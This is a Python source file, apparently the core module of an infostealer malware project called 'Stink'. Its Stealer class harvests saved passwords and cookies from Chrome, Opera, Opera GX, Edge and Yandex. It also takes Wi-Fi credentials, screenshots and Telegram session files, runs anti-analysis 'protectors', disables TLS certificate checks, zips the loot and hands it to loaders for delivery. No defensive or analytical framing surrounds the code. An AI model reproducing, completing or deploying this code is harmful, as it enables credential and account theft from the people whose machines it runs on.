import ssl
from time import sleep
from typing import List
from threading import Thread
from multiprocessing import Pool

from stink.enums import Features, Utils, Protectors
from stink.helpers import functions, MemoryStorage
from stink.helpers.config import MultistealerConfig, Browsers
from stink.utils import Message, Protector, Loader, Grabber
from stink.modules import (
    Chromium,
    Screenshot,
    Telegram,
    Wifi,
)


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(
            self,
            features: List[Features] = None,
            utils: List[Utils] = None,
            loaders: List[Loader] = None,
            protectors: List[Protectors] = None,
            grabbers: List[Grabber] = None,
            delay: int = 0,
    ):
        Thread.__init__(self, name="Stealer")

        if loaders is None:
            self.__loaders = []
        else:
            self.__loaders = loaders

        if grabbers is None:
            self.__grabbers = []
        else:
            self.__grabbers = grabbers

        if utils is None:
            utils = []

        if features is None:
            features = [Features.all]

        if protectors is None:
            self.__protectors = [Protectors.disable]
        else:
            self.__protectors = protectors

        self.__message = Utils.message in utils
        self.__delay = delay

        self.__config = MultistealerConfig()
        self.__storage = MemoryStorage()

        browser_functions = [
            Features.passwords,
            Features.cookies,
        ]
        browser_statuses = len(browser_functions) > 0

        self.__methods = [
            {
                "object": Chromium,
                "arguments": (
                    Browsers.CHROME.value,
                    self.__config.BrowsersData[Browsers.CHROME]["path"],
                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_GX.value,
                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.EDGE.value,
                    self.__config.BrowsersData[Browsers.EDGE]["path"],
                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Chromium,
                "arguments": (
                    Browsers.YANDEX.value,
                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                    browser_functions,
                ),
                "status": browser_statuses,
            },
            {
                "object": Wifi,
                "arguments": ("System",),
                "status": Features.wifi in features or Features.all in features,
            },
            {
                "object": Screenshot,
                "arguments": ("System",),
                "status": Features.screenshot in features or Features.all in features,
            },
            {
                "object": Telegram,
                "arguments": ("Programs/Telegram",),
                "status": Features.telegram in features or Features.all in features,
            }
        ]

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            sleep(self.__delay)

            if self.__message is True:
                Thread(target=Message().run).start()

            Protector(self.__protectors).run()

            ssl._create_default_https_context = ssl._create_unverified_context

            with Pool(processes=self.__config.PoolSize) as pool:
                results = pool.starmap(
                    functions.run_process,
                    [
                        (method["object"], method["arguments"])
                        for method in self.__methods
                        if method["status"] is True
                    ],
                )
            pool.close()

            if self.__grabbers:
                with Pool(processes=self.__config.PoolSize) as pool:
                    grabber_results = pool.starmap(
                        functions.run_process,
                        [(grabber, None) for grabber in self.__grabbers],
                    )
                pool.close()

                results += grabber_results

            self.__storage.create_zip(
                [file for files in results if files for file in files]
            )

            for loader in self.__loaders:
                loader.run()

        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")
